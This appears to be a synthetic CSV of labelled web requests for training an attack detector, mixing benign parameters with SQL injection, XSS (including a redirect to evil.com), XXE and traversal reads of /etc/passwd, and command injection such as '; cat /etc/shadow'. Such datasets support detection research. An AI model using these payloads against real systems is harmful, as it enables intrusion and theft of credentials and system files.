attack_type,payload,endpoint,http_method,request_body,source_ip
normal,product=1,/rest/basket,POST,product=1,192.168.1.169
normal,sort=price,/#/search,POST,sort=price,192.168.1.3
sqli,' OR '1'='1' --,/api/Products,GET,' OR '1'='1' --,192.168.1.193
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.133
normal,category=juice,/profile,GET,category=juice,192.168.1.68
normal,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.241
xss,<img src=x onerror=alert(1)>,/redirect,POST,<img src=x onerror=alert(1)>,192.168.1.124
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,GET,"' UNION SELECT username, password FROM Users--",192.168.1.191
rce,| ls -la /,/rest/basket,POST,| ls -la /,192.168.1.56
normal,product=1,/rest/basket,POST,product=1,192.168.1.239
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.147
normal,category=juice,/profile,POST,category=juice,192.168.1.149
normal,sort=price,/profile,POST,sort=price,192.168.1.56
rce,; cat /etc/shadow,/api/Products,POST,; cat /etc/shadow,192.168.1.178
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.58
sqli,' OR '1'='1' --,/redirect,GET,' OR '1'='1' --,192.168.1.156
normal,search=apple,/ftp,GET,search=apple,192.168.1.138
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.112
normal,search=apple,/#/search,GET,search=apple,192.168.1.117
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.180
sqli,' OR '1'='1' --,/rest/basket,POST,' OR '1'='1' --,192.168.1.145
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.31
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.213
normal,sort=price,/api/Products,GET,sort=price,192.168.1.252
xss,<img src=x onerror=alert(1)>,/rest/basket,POST,<img src=x onerror=alert(1)>,192.168.1.53
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.100
normal,sort=price,/rest/basket,GET,sort=price,192.168.1.63
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.203
normal,search=apple,/rest/basket,POST,search=apple,192.168.1.91
normal,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.141
normal,sort=price,/rest/basket,POST,sort=price,192.168.1.23
normal,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.52
normal,page=1,/rest/user/login,GET,page=1,192.168.1.6
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.92
normal,category=juice,/rest/basket,POST,category=juice,192.168.1.59
normal,search=apple,/rest/admin/application-configuration,POST,search=apple,192.168.1.189
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.20
lfi,../../../../etc/passwd,/#/search,GET,../../../../etc/passwd,192.168.1.187
normal,sort=price,/rest/basket,POST,sort=price,192.168.1.21
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/api/Products,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.192
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/basket,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.113
sqli,"' UNION SELECT username, password FROM Users--",/redirect,POST,"' UNION SELECT username, password FROM Users--",192.168.1.95
rce,; cat /etc/shadow,/rest/user/login,POST,; cat /etc/shadow,192.168.1.34
xss,<script>document.location='http://evil.com'</script>,/redirect,POST,<script>document.location='http://evil.com'</script>,192.168.1.242
normal,product=1,/rest/user/login,POST,product=1,192.168.1.88
normal,product=1,/redirect,GET,product=1,192.168.1.116
normal,product=1,/rest/basket,POST,product=1,192.168.1.224
normal,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.170
rce,; cat /etc/shadow,/rest/user/login,GET,; cat /etc/shadow,192.168.1.155
normal,sort=price,/ftp,POST,sort=price,192.168.1.62
normal,category=juice,/rest/basket,POST,category=juice,192.168.1.87
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.90
xss,<script>document.location='http://evil.com'</script>,/api/Products,GET,<script>document.location='http://evil.com'</script>,192.168.1.82
normal,category=juice,/rest/basket,POST,category=juice,192.168.1.140
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,POST,"' UNION SELECT username, password FROM Users--",192.168.1.108
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.57
normal,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.96
normal,email=user@test.com,/redirect,GET,email=user@test.com,192.168.1.152
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.244
normal,sort=price,/redirect,GET,sort=price,192.168.1.133
xss,<img src=x onerror=alert(1)>,/ftp,GET,<img src=x onerror=alert(1)>,192.168.1.93
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.185
normal,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.36
normal,search=apple,/rest/user/login,GET,search=apple,192.168.1.25
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/user/login,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.146
rce,| ls -la /,/api/Products,POST,| ls -la /,192.168.1.30
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.176
sqli,' OR '1'='1' --,/profile,GET,' OR '1'='1' --,192.168.1.28
sqli,"' UNION SELECT username, password FROM Users--",/#/search,POST,"' UNION SELECT username, password FROM Users--",192.168.1.158
normal,search=apple,/rest/user/login,GET,search=apple,192.168.1.64
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,POST,"' UNION SELECT username, password FROM Users--",192.168.1.61
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/basket,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.11
normal,category=juice,/api/Products,GET,category=juice,192.168.1.199
normal,product=1,/redirect,GET,product=1,192.168.1.102
normal,sort=price,/profile,POST,sort=price,192.168.1.118
normal,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.231
rce,; cat /etc/shadow,/rest/user/login,POST,; cat /etc/shadow,192.168.1.70
xss,<script>document.location='http://evil.com'</script>,/redirect,POST,<script>document.location='http://evil.com'</script>,192.168.1.75
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.163
sqli,"' UNION SELECT username, password FROM Users--",/redirect,GET,"' UNION SELECT username, password FROM Users--",192.168.1.138
xss,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.193
normal,sort=price,/redirect,GET,sort=price,192.168.1.253
sqli,' OR '1'='1' --,/rest/admin/application-configuration,POST,' OR '1'='1' --,192.168.1.228
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.157
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/profile,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.57
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.105
xss,<script>document.location='http://evil.com'</script>,/rest/basket,POST,<script>document.location='http://evil.com'</script>,192.168.1.242
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.65
normal,product=1,/rest/user/login,POST,product=1,192.168.1.10
normal,product=1,/redirect,GET,product=1,192.168.1.86
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.250
normal,page=1,/rest/basket,GET,page=1,192.168.1.185
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.47
sqli,"' UNION SELECT username, password FROM Users--",/redirect,POST,"' UNION SELECT username, password FROM Users--",192.168.1.104
sqli,"' UNION SELECT username, password FROM Users--",/rest/basket,GET,"' UNION SELECT username, password FROM Users--",192.168.1.24
sqli,' OR '1'='1' --,/redirect,POST,' OR '1'='1' --,192.168.1.214
normal,page=1,/rest/basket,GET,page=1,192.168.1.82
normal,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.86
normal,page=1,/profile,GET,page=1,192.168.1.141
normal,product=1,/rest/user/login,POST,product=1,192.168.1.2
sqli,' OR '1'='1' --,/redirect,GET,' OR '1'='1' --,192.168.1.101
normal,search=apple,/profile,POST,search=apple,192.168.1.203
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.134
rce,; cat /etc/shadow,/#/search,GET,; cat /etc/shadow,192.168.1.92
normal,search=apple,/profile,POST,search=apple,192.168.1.35
normal,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.218
rce,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.128
normal,product=1,/#/search,GET,product=1,192.168.1.153
normal,search=apple,/rest/basket,GET,search=apple,192.168.1.146
normal,category=juice,/ftp,POST,category=juice,192.168.1.184
normal,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.183
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.23
normal,product=1,/rest/user/login,GET,product=1,192.168.1.87
rce,; cat /etc/shadow,/rest/basket,POST,; cat /etc/shadow,192.168.1.100
rce,| ls -la /,/api/Products,GET,| ls -la /,192.168.1.28
rce,; cat /etc/shadow,/profile,POST,; cat /etc/shadow,192.168.1.43
normal,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.177
normal,product=1,/redirect,POST,product=1,192.168.1.145
normal,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.91
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.31
normal,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.183
normal,category=juice,/rest/basket,POST,category=juice,192.168.1.94
sqli,"' UNION SELECT username, password FROM Users--",/profile,GET,"' UNION SELECT username, password FROM Users--",192.168.1.101
normal,page=1,/rest/user/login,GET,page=1,192.168.1.28
normal,sort=price,/ftp,POST,sort=price,192.168.1.119
normal,product=1,/#/search,GET,product=1,192.168.1.7
xss,<script>document.location='http://evil.com'</script>,/redirect,GET,<script>document.location='http://evil.com'</script>,192.168.1.127
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.219
normal,page=1,/#/search,POST,page=1,192.168.1.43
normal,page=1,/redirect,POST,page=1,192.168.1.209
normal,search=apple,/rest/basket,GET,search=apple,192.168.1.215
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.47
normal,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.117
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.113
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.117
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.150
normal,product=1,/redirect,GET,product=1,192.168.1.247
normal,product=1,/rest/basket,GET,product=1,192.168.1.224
normal,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.208
normal,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.80
rce,| ls -la /,/rest/user/login,POST,| ls -la /,192.168.1.5
xss,<img src=x onerror=alert(1)>,/#/search,POST,<img src=x onerror=alert(1)>,192.168.1.97
lfi,../../../../etc/passwd,/#/search,POST,../../../../etc/passwd,192.168.1.214
normal,sort=price,/#/search,GET,sort=price,192.168.1.240
normal,email=user@test.com,/redirect,GET,email=user@test.com,192.168.1.63
normal,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.223
normal,search=apple,/rest/user/login,POST,search=apple,192.168.1.2
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.168
normal,search=apple,/ftp,POST,search=apple,192.168.1.221
normal,product=1,/rest/user/login,POST,product=1,192.168.1.8
normal,product=1,/#/search,GET,product=1,192.168.1.132
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.50
normal,page=1,/redirect,POST,page=1,192.168.1.236
normal,product=1,/#/search,POST,product=1,192.168.1.231
normal,page=1,/api/Products,GET,page=1,192.168.1.155
normal,sort=price,/rest/basket,GET,sort=price,192.168.1.239
rce,; cat /etc/shadow,/profile,GET,; cat /etc/shadow,192.168.1.189
normal,product=1,/profile,POST,product=1,192.168.1.91
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.109
sqli,' OR '1'='1' --,/ftp,GET,' OR '1'='1' --,192.168.1.103
rce,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.247
xss,<img src=x onerror=alert(1)>,/#/search,GET,<img src=x onerror=alert(1)>,192.168.1.126
lfi,../../../../etc/passwd,/rest/user/login,GET,../../../../etc/passwd,192.168.1.214
normal,page=1,/redirect,POST,page=1,192.168.1.223
normal,sort=price,/rest/user/login,POST,sort=price,192.168.1.20
normal,search=apple,/#/search,POST,search=apple,192.168.1.181
rce,| ls -la /,/redirect,GET,| ls -la /,192.168.1.51
normal,sort=price,/rest/user/login,GET,sort=price,192.168.1.190
normal,product=1,/api/Products,GET,product=1,192.168.1.19
normal,category=juice,/profile,POST,category=juice,192.168.1.169
lfi,../../../../etc/passwd,/rest/basket,POST,../../../../etc/passwd,192.168.1.151
sqli,"' UNION SELECT username, password FROM Users--",/profile,POST,"' UNION SELECT username, password FROM Users--",192.168.1.149
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.97
normal,category=juice,/ftp,POST,category=juice,192.168.1.165
normal,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.192
normal,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.206
normal,search=apple,/rest/basket,POST,search=apple,192.168.1.12
normal,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.201
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.225
